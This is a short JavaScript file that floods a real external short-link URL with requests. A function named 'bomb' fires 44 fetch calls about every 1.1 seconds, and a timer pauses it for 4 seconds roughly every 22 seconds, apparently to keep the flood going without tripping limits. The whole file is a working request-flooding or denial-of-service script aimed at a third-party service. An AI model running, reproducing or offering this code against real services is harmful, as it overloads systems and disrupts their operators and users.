const fetchURL = 'https://v.triller.co/RNr66r'

const bomb = () => {
    fetch(fetchURL)
}

let govno = setInterval(() => {
    bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb();
    bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb();
    bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb();
    bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb();
    bomb(); bomb(); bomb(); bomb();
    console.info('___________________________________________')
}, 1100);

setInterval(() => {
    clearInterval(govno)

    setTimeout(() => {
        console.log('CHILL TIME - CHILL TIME - CHILL TIME - CHILL TIME - CHILL TIME - ')
        govno = setInterval(() => {
            bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb();
            bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb();
            bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb();
            bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb(); bomb();
            bomb(); bomb(); bomb(); bomb();
        }, 1100);
    }, 4000)
}, 22000);
